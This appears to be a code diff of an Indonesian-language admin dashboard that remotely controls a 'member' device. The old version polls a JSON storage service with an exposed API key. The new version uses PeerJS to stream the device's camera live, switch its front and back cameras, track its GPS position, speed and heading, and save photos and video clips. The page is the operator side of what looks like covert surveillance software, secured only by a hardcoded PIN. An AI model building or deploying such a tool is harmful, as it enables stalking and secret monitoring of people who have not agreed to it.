@@ -3,26 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Status Sesi & Lokasi</title>
+    <title>Admin Realtime - Kamera & Lokasi</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
-        .container { max-width: 980px; margin: 0 auto; }
+        .container { max-width: 960px; margin: 0 auto; }
 
         #loginScreen {
-            max-width: 360px;
-            margin: 100px auto;
-            background: #1e293b;
-            padding: 28px;
-            border-radius: 14px;
-            border: 1px solid #334155;
-            text-align: center;
+            max-width: 360px; margin: 100px auto; background: #1e293b;
+            padding: 28px; border-radius: 14px; border: 1px solid #334155; text-align: center;
         }
         #loginScreen h2 { margin-bottom: 16px; font-size: 20px; }
         #loginScreen input {
-            width: 100%; padding: 12px; margin-bottom: 14px;
-            border-radius: 8px; border: 1px solid #475569;
-            background: #0f172a; color: #fff; text-align: center; font-size: 16px;
+            width: 100%; padding: 12px; margin-bottom: 14px; border-radius: 8px;
+            border: 1px solid #475569; background: #0f172a; color: #fff; text-align: center; font-size: 16px;
         }
 
         #dashboard { display: none; }
@@ -32,88 +26,68 @@
             padding-bottom: 16px; border-bottom: 1px solid #334155;
         }
         .header h1 { font-size: 22px; }
-        .live-pill {
-            display: inline-flex; align-items: center; gap: 6px;
-            font-size: 12px; color: #4ade80;
-            background: rgba(34, 197, 94, 0.14); border: 1px solid rgba(34, 197, 94, 0.35);
-            padding: 4px 10px; border-radius: 999px; margin-top: 6px;
-        }
-        .dot { width: 8px; height: 8px; border-radius: 50%; background: #4ade80; }
-        .actions { display: flex; gap: 10px; flex-wrap: wrap; }
         button {
             padding: 10px 15px; border: none; border-radius: 8px;
             font-weight: 600; cursor: pointer; font-size: 13px;
         }
         .btn-primary { background: #3b82f6; color: white; }
         .btn-primary:hover { background: #2563eb; }
+        .btn-cam { background: #6366f1; color: white; }
+        .btn-cam:hover { background: #4f46e5; }
         .btn-photo { background: #10b981; color: white; }
         .btn-photo:hover { background: #059669; }
         .btn-rec { background: #ef4444; color: white; }
         .btn-rec:hover { background: #dc2626; }
-        .btn-danger { background: #7f1d1d; color: #fecaca; }
-        .btn-danger:hover { background: #991b1b; }
 
-        .section-title { font-size: 16px; margin-bottom: 12px; color: #e2e8f0; }
-
-        .status-card {
+        .stage {
             background: #1e293b; border: 1px solid #334155;
-            border-radius: 12px; padding: 16px; margin-bottom: 22px;
+            border-radius: 14px; padding: 16px; margin-bottom: 22px;
+        }
+        .video-wrap {
+            position: relative; width: 100%; max-width: 560px; aspect-ratio: 4 / 3;
+            margin: 0 auto 14px; background: #020617; border-radius: 12px;
+            overflow: hidden; border: 1px solid #334155; display: flex;
+            align-items: center; justify-content: center;
+        }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .overlay-top {
+            position: absolute; top: 10px; left: 10px; right: 10px;
+            display: flex; justify-content: space-between; gap: 8px; pointer-events: none;
+        }
+        .pill {
+            font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
+            background: rgba(15, 23, 42, 0.82); color: #e2e8f0;
+        }
+        .pill-live { background: rgba(239, 68, 68, 0.92); color: #fff; }
+
+        .meta-bar {
+            background: #0f172a; border: 1px solid #334155; border-radius: 10px;
+            padding: 12px; margin-bottom: 12px; font-size: 12px; color: #cbd5e1;
             display: flex; justify-content: space-between; align-items: center;
+            flex-wrap: wrap; gap: 10px;
+        }
+        .btn-map {
+            background: #0ea5e9; color: #fff; text-decoration: none;
+            padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: 600;
+        }
+        .controls { display: flex; gap: 10px; flex-wrap: wrap; }
+        .info-text { font-size: 12px; color: #94a3b8; margin-top: 10px; }
+
+        .captures-grid { display: grid; gap: 14px; }
+        .cap-card {
+            background: #1e293b; border: 1px solid #334155; border-radius: 12px;
+            padding: 14px; display: flex; justify-content: space-between; align-items: center;
             flex-wrap: wrap; gap: 14px;
         }
-        .status-card h3 { font-size: 15px; color: #fff; margin-bottom: 5px; }
-        .status-card p { font-size: 12px; color: #94a3b8; margin-bottom: 3px; }
-        .badge-online {
-            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 6px;
-            background: rgba(34, 197, 94, 0.2); color: #4ade80; margin-left: 6px;
+        .cap-card img, .cap-card video {
+            width: 180px; height: 135px; object-fit: cover; border-radius: 8px; background: #020617;
         }
-        .badge-closed {
-            display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 6px;
-            background: rgba(148, 163, 184, 0.2); color: #cbd5e1; margin-left: 6px;
+        .btn-dl {
+            background: #475569; color: #fff; text-decoration: none;
+            padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: 600;
         }
-
-        .cmd-panel {
-            background: #1e293b; border: 1px solid #334155;
-            border-radius: 12px; padding: 16px; margin-bottom: 24px;
-        }
-        .cmd-panel h2 { font-size: 15px; margin-bottom: 10px; }
-        .cmd-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-        .cmd-status { font-size: 12px; color: #94a3b8; margin-top: 10px; }
-
-        .log-grid { display: grid; gap: 16px; }
-        .log-card {
-            background: #1e293b; border: 1px solid #334155;
-            border-radius: 12px; padding: 18px;
-            display: flex; justify-content: space-between; align-items: center;
-            flex-wrap: wrap; gap: 16px;
-        }
-        .log-left { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; flex: 1; }
-        .media-box {
-            width: 170px; height: 128px; border-radius: 8px;
-            border: 1px solid #475569; background: #0f172a;
-            overflow: hidden; display: flex; align-items: center; justify-content: center;
-        }
-        .media-box img, .media-box video { width: 100%; height: 100%; object-fit: cover; }
-        .log-info h3 { font-size: 16px; color: #fff; margin-bottom: 6px; }
-        .log-info p { font-size: 13px; color: #94a3b8; margin-bottom: 4px; }
-        .badge {
-            display: inline-block; background: rgba(59, 130, 246, 0.15);
-            color: #60a5fa; padding: 3px 8px; border-radius: 6px; font-size: 11px; margin-left: 4px;
-        }
-        .badge-rec { background: rgba(239, 68, 68, 0.18); color: #f87171; }
-        .device-info { font-size: 11px !important; color: #64748b !important; max-width: 440px; word-break: break-all; }
-        .card-actions { display: flex; flex-direction: column; gap: 8px; min-width: 165px; }
-        .btn-map, .btn-dl {
-            color: #fff; text-decoration: none; text-align: center;
-            padding: 9px 14px; border-radius: 8px; font-size: 12px; font-weight: 600;
-            display: inline-block;
-        }
-        .btn-map { background: #0ea5e9; }
-        .btn-map:hover { background: #0284c7; }
-        .btn-dl { background: #475569; }
-        .btn-dl:hover { background: #334155; }
-        .empty-state { text-align: center; padding: 28px; color: #64748b; background: #1e293b; border-radius: 12px; border: 1px solid #334155; }
     </style>
+    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 </head>
 <body>
 
@@ -127,243 +101,235 @@
     <div id="dashboard">
         <div class="header">
             <div>
-                <h1>📍📷 Pantau Sesi & Log</h1>
-                <div class="live-pill"><span class="dot"></span> Auto-Sync (tiap 3d) • Total Log: <span id="totalCount">0</span></div>
+                <h1>📹 Live View Realtime</h1>
             </div>
-            <div class="actions">
-                <button class="btn-primary" onclick="syncAll(true)">🔄 Sinkron Sekarang</button>
-                <button class="btn-danger" onclick="clearLogs()">🗑️ Hapus Log</button>
+            <div>
+                <button class="btn-primary" onclick="connectToMember()">🔌 Hubungkan ke Perangkat</button>
             </div>
         </div>
 
-        <h2 class="section-title">🛰️ Status Chrome & Pergerakan Lokasi</h2>
-        <div id="sessionContainer" class="live-grid">
-            <div class="empty-state">Menunggu sesi aktif...</div>
-        </div>
-
-        <div class="cmd-panel">
-            <h2>Kirim Perintah Saat Chrome Member Terbuka</h2>
-            <div class="cmd-row">
-                <button class="btn-photo" onclick="sendCommand('PHOTO')">📸 Ambil Foto</button>
-                <button class="btn-rec" onclick="sendCommand('RECORD')">🎥 Rekam Klip (3,5d)</button>
+        <div class="stage">
+            <div class="video-wrap">
+                <div class="overlay-top">
+                    <div style="display:flex;gap:6px;">
+                        <span class="pill pill-live" id="connBadge">BELUM TERHUBUNG</span>
+                        <span class="pill" id="camBadge">KAMERA: -</span>
+                    </div>
+                    <span class="pill" id="recBadge" style="display:none;background:#dc2626;color:#fff;">● MEREKAM</span>
+                </div>
+                <video id="remoteVideo" autoplay playsinline></video>
+                <span id="placeholderText" style="color:#64748b;font-size:13px;">Klik "Hubungkan ke Perangkat" saat halaman member terbuka.</span>
             </div>
-            <div id="cmdStatus" class="cmd-status">Status perintah: Siap mengirim perintah.</div>
+
+            <div class="meta-bar">
+                <div id="locText"><strong>Lokasi:</strong> Menunggu data...</div>
+                <div id="mapLinkWrap"></div>
+            </div>
+
+            <div class="controls">
+                <button class="btn-cam" onclick="switchCamera('user')">🤳 Kamera Depan</button>
+                <button class="btn-cam" onclick="switchCamera('environment')">📷 Kamera Belakang</button>
+                <button class="btn-photo" onclick="snapPhoto()">📸 Ambil Foto</button>
+                <button class="btn-rec" id="btnRec" onclick="recordClip()">🎥 Rekam Klip (5d)</button>
+            </div>
+            <div id="statusMsg" class="info-text">Status: Siap.</div>
         </div>
 
-        <h2 class="section-title">📂 Hasil Foto & Rekaman Tersimpan</h2>
-        <div id="logContainer" class="log-grid">
-            <div class="empty-state">Memuat data...</div>
-        </div>
+        <h2 style="font-size:16px;margin-bottom:12px;">Hasil Foto & Rekaman Lokal (Sesi Ini)</h2>
+        <div id="capturesList" class="captures-grid"></div>
     </div>
 </div>
 
 <script>
     const ADMIN_PIN = "123456";
-    const JSON_URL  = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
-    const API_KEY   = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
-    const AUTO_SYNC_MS = 3000;
+    const ROOM_ID = "jirun-live-room-9988";
 
-    let syncTimer = null;
-    let isFetching = false;
-    let lastRenderedLogCount = -1;
+    let peer = null;
+    let dataConn = null;
+    let currentMediaStream = null;
+    let currentCamLabel = "-";
+    let currentLoc = null;
+
+    const remoteVideo = document.getElementById("remoteVideo");
+    const placeholderText = document.getElementById("placeholderText");
+    const connBadge = document.getElementById("connBadge");
+    const camBadge = document.getElementById("camBadge");
+    const recBadge = document.getElementById("recBadge");
+    const locText = document.getElementById("locText");
+    const mapLinkWrap = document.getElementById("mapLinkWrap");
+    const statusMsg = document.getElementById("statusMsg");
+    const capturesList = document.getElementById("capturesList");
 
     function checkPin() {
-        const input = document.getElementById('pinInput').value;
-        if (input === ADMIN_PIN) {
-            document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('dashboard').style.display = 'block';
-            startAutoSync();
+        const val = document.getElementById("pinInput").value;
+        if (val === ADMIN_PIN) {
+            document.getElementById("loginScreen").style.display = "none";
+            document.getElementById("dashboard").style.display = "block";
+            connectToMember();
         } else {
             alert("PIN salah!");
         }
     }
 
-    function startAutoSync() {
-        if (syncTimer) clearInterval(syncTimer);
-        syncAll(true);
-        syncTimer = setInterval(() => syncAll(false), AUTO_SYNC_MS);
-    }
-
-    async function sendCommand(actionType) {
-        const cmdStatus = document.getElementById('cmdStatus');
-        cmdStatus.textContent = "Mengirim perintah...";
-
-        try {
-            const getRes = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
-            let currentData = { logs: [], liveSessions: {} };
-            if (getRes.ok) {
-                const parsed = await getRes.json();
-                currentData = {
-                    logs: Array.isArray(parsed.logs) ? parsed.logs : [],
-                    liveSessions: parsed.liveSessions && typeof parsed.liveSessions === "object" ? parsed.liveSessions : {},
-                    command: parsed.command || {}
-                };
-            }
-
-            currentData.command = {
-                action: actionType,
-                targetSessionId: null,
-                token: "cmd_" + Date.now() + "_" + Math.random().toString(36).slice(2, 6)
-            };
-
-            const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
-            const putRes = await fetch(putUrl, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(currentData)
-            });
-
-            if (!putRes.ok) throw new Error("Gagal mengirim perintah");
-
-            cmdStatus.textContent = `Perintah ${actionType} terkirim. Tunggu beberapa detik hingga hasil muncul di log.`;
-        } catch (err) {
-            cmdStatus.textContent = "Gagal mengirim perintah.";
-            console.error(err);
-        }
-    }
-
-    function renderSessions(liveSessions) {
-        const container = document.getElementById('sessionContainer');
-        const list = Object.values(liveSessions || {})
-            .filter(item => item && item.lat !== null && item.lng !== null)
-            .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
-
-        if (list.length === 0) {
-            container.innerHTML = '<div class="empty-state">Belum ada sesi perangkat.</div>';
+    function updateLocationUI(loc) {
+        currentLoc = loc;
+        if (!loc || loc.lat === undefined || loc.lng === undefined) {
+            locText.innerHTML = "<strong>Lokasi:</strong> Menunggu koordinat...";
+            mapLinkWrap.innerHTML = "";
             return;
         }
+        locText.innerHTML = `
+            <strong>Lokasi:</strong> ${loc.lat}, ${loc.lng} (${loc.accuracy || "-"}) •
+            <strong>Kecepatan:</strong> ${loc.speed || "-"} •
+            <strong>Arah:</strong> ${loc.heading || "-"}
+        `;
+        mapLinkWrap.innerHTML = `<a class="btn-map" href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank">Buka Maps ↗</a>`;
+    }
 
-        const latest = list[0];
-        const ageSec = latest.updatedAt ? Math.max(0, Math.round((Date.now() - latest.updatedAt) / 1000)) : null;
-        const isOpen = ageSec !== null && ageSec <= 10;
+    function connectToMember() {
+        statusMsg.textContent = "Status: Menghubungkan ke perangkat...";
+        if (peer) {
+            peer.destroy();
+            peer = null;
+        }
+        peer = new Peer();
 
-        const statusBadge = isOpen
-            ? `<span class="badge-online">Chrome Terbuka • Kamera ${latest.kameraAktif ? "Siap" : "Nonaktif"}</span>`
-            : `<span class="badge-closed">Chrome Ditutup / Tidak Aktif (${ageSec ?? "-"}d lalu)</span>`;
+        peer.on("open", () => {
+            dataConn = peer.connect(ROOM_ID);
+            dataConn.on("open", () => {
+                connBadge.textContent = "LIVE TERHUBUNG";
+                statusMsg.textContent = "Status: Terhubung realtime.";
+                dataConn.send({ type: "PING" });
+            });
+            dataConn.on("data", (msg) => {
+                if (!msg) return;
+                if (msg.type === "STATUS") {
+                    currentCamLabel = msg.facing || "-";
+                    camBadge.textContent = "KAMERA: " + currentCamLabel.toUpperCase();
+                    updateLocationUI(msg.location);
+                }
+            });
+            dataConn.on("close", () => {
+                connBadge.textContent = "TERPUTUS";
+                statusMsg.textContent = "Status: Koneksi ke perangkat terputus.";
+            });
 
-        container.innerHTML = `
-            <div class="status-card" style="margin-bottom:22px;">
+            // Stream kosong untuk menerima stream video dari perangkat member
+            const dummyCanvas = document.createElement("canvas");
+            dummyCanvas.width = 64;
+            dummyCanvas.height = 64;
+            const dummyStream = dummyCanvas.captureStream(1);
+
+            const call = peer.call(ROOM_ID, dummyStream);
+            if (call) {
+                call.on("stream", (remoteStream) => {
+                    currentMediaStream = remoteStream;
+                    remoteVideo.srcObject = remoteStream;
+                    remoteVideo.style.display = "block";
+                    placeholderText.style.display = "none";
+                    connBadge.textContent = "LIVE STREAM";
+                });
+            }
+        });
+
+        peer.on("error", () => {
+            statusMsg.textContent = "Status: Perangkat belum aktif atau gagal terhubung. Coba klik Hubungkan lagi.";
+        });
+    }
+
+    function switchCamera(facing) {
+        if (!dataConn || !dataConn.open) {
+            alert("Hubungkan ke perangkat terlebih dahulu.");
+            return;
+        }
+        statusMsg.textContent = "Status: Mengganti kamera...";
+        dataConn.send({ type: "SWITCH_CAM", facing: facing });
+    }
+
+    function addCaptureCard(htmlContent) {
+        const card = document.createElement("div");
+        card.className = "cap-card";
+        card.innerHTML = htmlContent;
+        capturesList.prepend(card);
+    }
+
+    function snapPhoto() {
+        if (!currentMediaStream || remoteVideo.readyState < 2) {
+            alert("Belum ada stream video aktif.");
+            return;
+        }
+        const c = document.createElement("canvas");
+        c.width = remoteVideo.videoWidth || 640;
+        c.height = remoteVideo.videoHeight || 480;
+        c.getContext("2d").drawImage(remoteVideo, 0, 0, c.width, c.height);
+        const dataUrl = c.toDataURL("image/jpeg", 0.8);
+        const fileName = `foto_${Date.now()}.jpg`;
+        const locStr = currentLoc ? `${currentLoc.lat}, ${currentLoc.lng}` : "-";
+
+        addCaptureCard(`
+            <div style="display:flex;gap:14px;align-items:center;flex-wrap:wrap;">
+                <img src="${dataUrl}" alt="Foto">
                 <div>
-                    <h3>${escapeHtml(latest.nama || "HP Saya")} ${statusBadge}</h3>
-                    <p>🌐 <strong>Koordinat:</strong> ${latest.lat}, ${latest.lng} • <strong>Akurasi:</strong> ${escapeHtml(latest.akurasi || "-")}</p>
-                    <p>🧭 <strong>Kecepatan:</strong> ${escapeHtml(latest.kecepatan || "-")} • <strong>Arah:</strong> ${escapeHtml(latest.arah || "-")} • <strong>Update:</strong> ${escapeHtml(latest.waktu || "-")}</p>
-                </div>
-                <div>
-                    <a class="btn-map" href="https://www.google.com/maps?q=${latest.lat},${latest.lng}" target="_blank">Buka di Google Maps ↗</a>
+                    <strong style="font-size:15px;">Foto (${currentCamLabel})</strong>
+                    <p style="font-size:12px;color:#94a3b8;margin-top:4px;">Lokasi: ${locStr}</p>
+                    <p style="font-size:12px;color:#94a3b8;">Waktu: ${new Date().toLocaleTimeString("id-ID")}</p>
                 </div>
             </div>
-        `;
+            <a class="btn-dl" href="${dataUrl}" download="${fileName}">⬇ Unduh Foto</a>
+        `);
     }
 
-    function renderLogs(logs, forceRender) {
-        const container = document.getElementById('logContainer');
-        document.getElementById('totalCount').textContent = logs.length;
+    function recordClip() {
+        if (!currentMediaStream || !window.MediaRecorder) {
+            alert("Stream video atau MediaRecorder tidak tersedia.");
+            return;
+        }
+        const btnRec = document.getElementById("btnRec");
+        btnRec.disabled = true;
+        recBadge.style.display = "inline-block";
+        statusMsg.textContent = "Status: Merekam klip 5 detik...";
 
-        if (!forceRender && logs.length === lastRenderedLogCount) return;
-        lastRenderedLogCount = logs.length;
-
-        if (!logs || logs.length === 0) {
-            container.innerHTML = '<div class="empty-state">Belum ada foto atau rekaman tersimpan.</div>';
+        const chunks = [];
+        let recorder;
+        try {
+            recorder = new MediaRecorder(currentMediaStream);
+        } catch (e) {
+            alert("Gagal memulai perekaman.");
+            btnRec.disabled = false;
+            recBadge.style.display = "none";
             return;
         }
 
-        container.innerHTML = logs.map((item, idx) => {
-            const hasPhoto = typeof item.foto === "string" && item.foto.startsWith("data:image/");
-            const hasVideo = typeof item.video === "string" && item.video.startsWith("data:video/");
-            const hasCoords = item.lat !== null && item.lat !== undefined && item.lng !== null && item.lng !== undefined;
+        recorder.ondataavailable = (ev) => {
+            if (ev.data && ev.data.size > 0) chunks.push(ev.data);
+        };
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: recorder.mimeType || "video/webm" });
+            const url = URL.createObjectURL(blob);
+            const fileName = `rekaman_${Date.now()}.webm`;
+            const locStr = currentLoc ? `${currentLoc.lat}, ${currentLoc.lng}` : "-";
 
-            let mediaHtml = `<span style="font-size:11px;color:#64748b;">Tidak ada media</span>`;
-            let downloadHtml = "";
-
-            if (hasVideo) {
-                mediaHtml = `<video src="${item.video}" controls playsinline></video>`;
-                const ext = item.video.includes("mp4") ? "mp4" : "webm";
-                downloadHtml = `<a class="btn-dl" href="${item.video}" download="rekaman_${item.id || idx}.${ext}">⬇ Unduh Rekaman</a>`;
-            } else if (hasPhoto) {
-                mediaHtml = `<img src="${item.foto}" alt="Foto">`;
-                downloadHtml = `<a class="btn-dl" href="${item.foto}" download="foto_${item.id || idx}.jpg">⬇ Unduh Foto</a>`;
-            }
-
-            const mapHtml = hasCoords
-                ? `<a class="btn-map" href="https://www.google.com/maps?q=${item.lat},${item.lng}" target="_blank">Buka di Google Maps ↗</a>`
-                : `<span class="badge">Tanpa Koordinat</span>`;
-
-            const typeBadge = hasVideo
-                ? `<span class="badge badge-rec">REKAMAN KLIP</span>`
-                : `<span class="badge">FOTO</span>`;
-
-            return `
-                <div class="log-card">
-                    <div class="log-left">
-                        <div class="media-box">${mediaHtml}</div>
-                        <div class="log-info">
-                            <h3>${escapeHtml(item.nama)} ${typeBadge} <span class="badge">GPS: ${escapeHtml(item.akurasi || "-")}</span></h3>
-                            <p>🕒 <strong>Waktu:</strong> ${escapeHtml(item.waktu || "-")}</p>
-                            <p>🌐 <strong>Koordinat:</strong> ${hasCoords ? `${item.lat}, ${item.lng}` : "Tidak tersedia"}</p>
-                            <p class="device-info">📱 ${escapeHtml(item.perangkat || "")}</p>
-                        </div>
-                    </div>
-                    <div class="card-actions">
-                        ${mapHtml}
-                        ${downloadHtml}
+            addCaptureCard(`
+                <div style="display:flex;gap:14px;align-items:center;flex-wrap:wrap;">
+                    <video src="${url}" controls playsinline></video>
+                    <div>
+                        <strong style="font-size:15px;">Rekaman Klip (${currentCamLabel})</strong>
+                        <p style="font-size:12px;color:#94a3b8;margin-top:4px;">Lokasi: ${locStr}</p>
+                        <p style="font-size:12px;color:#94a3b8;">Waktu: ${new Date().toLocaleTimeString("id-ID")}</p>
                     </div>
                 </div>
-            `;
-        }).join('');
-    }
+                <a class="btn-dl" href="${url}" download="${fileName}">⬇ Unduh Rekaman</a>
+            `);
 
-    async function syncAll(forceRender) {
-        if (isFetching) return;
-        isFetching = true;
+            btnRec.disabled = false;
+            recBadge.style.display = "none";
+            statusMsg.textContent = "Status: Rekaman selesai.";
+        };
 
-        try {
-            const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
-            if (!res.ok) throw new Error("Gagal mengambil data");
-
-            const data = await res.json();
-            renderSessions(data.liveSessions || {});
-            renderLogs(Array.isArray(data.logs) ? data.logs : [], forceRender);
-        } catch (err) {
-            if (forceRender) {
-                document.getElementById('sessionContainer').innerHTML = '<div class="empty-state" style="color:#f87171;">Gagal menyinkronkan data.</div>';
-            }
-            console.error(err);
-        } finally {
-            isFetching = false;
-        }
-    }
-
-    async function clearLogs() {
-        if (!confirm("Yakin ingin menghapus seluruh riwayat foto & rekaman?")) return;
-        try {
-            const getRes = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
-            let currentCmd = { action: "NONE", targetSessionId: null, token: null };
-            let currentLive = {};
-            if (getRes.ok) {
-                const parsed = await getRes.json();
-                if (parsed && parsed.command) currentCmd = parsed.command;
-                if (parsed && parsed.liveSessions) currentLive = parsed.liveSessions;
-            }
-
-            const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
-            const res = await fetch(putUrl, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ logs: [], liveSessions: currentLive, command: currentCmd })
-            });
-            if (res.ok) {
-                syncAll(true);
-            } else {
-                alert("Gagal menghapus log.");
-            }
-        } catch (err) {
-            alert("Terjadi kesalahan koneksi.");
-        }
-    }
-
-    function escapeHtml(text) {
-        if (!text) return "";
-        return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+        recorder.start();
+        setTimeout(() => {
+            if (recorder.state === "recording") recorder.stop();
+        }, 5000);
     }
 </script>
 
